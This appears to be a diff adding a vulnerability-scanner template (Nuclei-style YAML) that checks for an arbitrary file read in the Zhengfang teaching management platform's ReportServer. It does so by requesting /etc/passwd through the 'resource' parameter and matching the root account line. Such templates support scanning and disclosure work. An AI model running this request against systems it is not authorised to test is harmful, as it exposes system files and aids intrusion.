@@ -1,0 +1,24 @@
+id: zfsoft-jxgl-reportserver-fileread
+
+info:
+  name: 正方教学管理信息服务平台 ReportServer 任意文件读取
+  author: qwtd
+  severity: high
+  tags: 正方教务管理系统
+
+http:
+  - raw:
+      - |
+        GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
